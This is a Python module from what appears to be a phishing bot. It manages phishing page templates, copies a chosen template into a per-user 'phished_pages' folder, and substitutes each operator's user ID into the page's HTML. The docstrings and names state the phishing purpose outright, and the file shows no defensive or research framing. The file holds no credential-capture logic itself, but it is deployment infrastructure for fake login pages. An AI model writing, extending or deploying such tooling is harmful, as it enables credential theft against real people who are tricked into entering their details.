import os
import shutil
import logging

# Set up logging
logger = logging.getLogger(__name__)

# Constants
TEMPLATES_DIR = "Templates"
PHISHED_PAGES_DIR = "phished_pages"


def create_directories():
    """Create necessary directories for the phishing bot"""
    base_dir = os.path.abspath(os.path.dirname(__file__))
    os.makedirs(os.path.join(base_dir, PHISHED_PAGES_DIR), exist_ok=True)
    os.makedirs(os.path.join(base_dir, TEMPLATES_DIR), exist_ok=True)
    logger.info(f"Directories created: {TEMPLATES_DIR}, {PHISHED_PAGES_DIR}")


def get_available_templates():
    """Get a list of available phishing templates"""
    templates = []
    # Look for all directories in the Templates folder using absolute path
    templates_dir = os.path.join(os.path.abspath(os.path.dirname(__file__)), TEMPLATES_DIR)
    if os.path.exists(templates_dir):
        template_dirs = [d for d in os.listdir(templates_dir)
                         if os.path.isdir(os.path.join(templates_dir, d))]

        for template in template_dirs:
            # Check if the template has an index.html file
            if os.path.exists(os.path.join(templates_dir, template, "index.html")):
                templates.append(template)

    return templates


def prepare_template(template, user_id):
    """Prepare a phishing template for a specific user"""
    # Get absolute paths
    base_dir = os.path.abspath(os.path.dirname(__file__))
    template_dir = os.path.join(base_dir, TEMPLATES_DIR, template)
    output_path = os.path.join(base_dir, PHISHED_PAGES_DIR, user_id)

    # Remove existing files if any
    if os.path.exists(output_path):
        try:
            shutil.rmtree(output_path)
            logger.info(f"Removed existing directory: {output_path}")
        except Exception as e:
            logger.error(f"Error removing existing directory: {e}")
            return {"success": False, "error": f"Could not remove existing directory: {e}"}

    try:
        # Create fresh directory
        os.makedirs(output_path, exist_ok=True)
        logger.info(f"Created directory: {output_path}")

        # Copy all files from template directory
        if os.path.exists(template_dir):
            # First copy index.html
            index_src = os.path.join(template_dir, "index.html")
            index_dst = os.path.join(output_path, "index.html")
            if os.path.exists(index_src):
                shutil.copy2(index_src, index_dst)
                logger.info(f"Copied index.html to {index_dst}")

                # Now copy any other assets
                for item in os.listdir(template_dir):
                    if item != "index.html":
                        src = os.path.join(template_dir, item)
                        dst = os.path.join(output_path, item)
                        if os.path.isfile(src):
                            shutil.copy2(src, dst)
                            logger.info(f"Copied asset {item}")
                        elif os.path.isdir(src):
                            shutil.copytree(src, dst, dirs_exist_ok=True)
                            logger.info(f"Copied directory {item}")

                # Add template info for tracking
                with open(os.path.join(output_path, "template_info.txt"), 'w') as f:
                    f.write(template)

                # Prepare the phishing page with the user_id
                if prepare_phishing_page(index_dst, index_dst, user_id, template):
                    return {"success": True}
                else:
                    return {"success": False, "error": "Failed to prepare phishing page"}
            else:
                return {"success": False, "error": f"Template index.html not found in {template_dir}"}
        else:
            return {"success": False, "error": f"Template directory not found: {template_dir}"}
    except Exception as e:
        logger.error(f"Error in template preparation: {e}")
        return {"success": False, "error": str(e)}


def prepare_phishing_page(template_path, output_path, user_id, template_name):
    """Modify HTML file to replace placeholders with user_id"""
    try:
        logger.info(f"Preparing phishing page. Template path: {template_path}")
        logger.info(f"Output path: {output_path}")

        # Read the template HTML
        with open(template_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Replace the USER_ID_PLACEHOLDER with the actual user_id
        content = content.replace('USER_ID_PLACEHOLDER', user_id)

        # Write the modified content to the output path
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(content)

        logger.info(f"Successfully prepared phishing page for {template_name} with user_id {user_id}")
        return True
    except Exception as e:
        logger.error(f"Error preparing phishing page: {e}")
        return False